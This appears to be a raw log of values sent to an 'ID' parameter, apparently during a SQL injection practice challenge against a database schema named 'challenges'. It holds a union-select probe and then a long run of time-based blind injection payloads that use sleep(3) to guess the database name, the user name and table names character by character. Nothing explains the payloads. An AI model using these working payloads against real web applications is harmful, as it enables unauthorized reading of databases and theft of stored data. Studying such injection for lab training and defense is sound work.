ID:1
ID:10
ID:-1' union select 1,2,3 -- 
ID:1'
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1
ID:1 and if(left(database(),1)='a',0,sleep(3))
ID:1 and if(left(database(),1)='a',0,sleep(3)) #
ID:1' and if(left(database(),1)='a',0,sleep(3)) #
ID:1' and if(left(database(),1)='s',0,sleep(3)) #
ID:1' and if(left(user(),1)='r',0,sleep(3)) #
ID:1' and if(left(user(),1)='r',0,sleep(3)) #
ID:1' and if(left(user(),1)='r',0,sleep(3)) #
ID:1' and if(left(user(),1)='r',0,sleep(3)) #
ID:1' and if(left(user(),1)='r',0,sleep(3)) #
ID:1' and if(left(user(),1)='r',0,sleep(3)) #
ID:1' and if(left(user(),1)='r',0,sleep(3)) #
ID:1' and if(left(user(),1)='a',0,sleep(3)) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'a') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'b') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'c') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'd') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'e') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),1) = 'f') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'fa') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'fb') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'fc') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'fd') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'fe') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'ff') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'fg') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'fh') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'fi') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'fj') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'fk') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'fl') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'fm') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'fn') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'fo') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'fp') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'fq') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'fr') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'fs') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'ft') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'fu') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'fv') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'fw') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'fx') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'fy') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'fz') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'fA') , sleep(3) , 0) #
ID:1' and if( (left((select table_name from information_schema.tables where table_schema = "challenges" limit 0,1),2) = 'fB') , sleep(3) , 0) #
